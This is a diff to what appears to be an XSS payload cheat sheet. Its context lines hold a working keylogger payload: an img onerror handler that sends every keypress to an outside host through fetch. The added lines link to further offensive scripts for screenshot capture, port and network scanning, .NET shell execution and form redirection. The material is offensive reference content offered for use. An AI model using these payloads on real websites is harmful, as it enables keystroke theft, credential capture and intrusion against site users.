@@ -31,6 +31,15 @@ Keylogger for XSS
 <img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
 ```
 
+More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):
+  - [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
+  - [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/)
+  - [Network Scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
+  - [.NET Shell execution](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
+  - [Redirect Form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
+  - [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)
+
+
 ## Identify an XSS endpoint
 ```
 <script>debugger;</script>
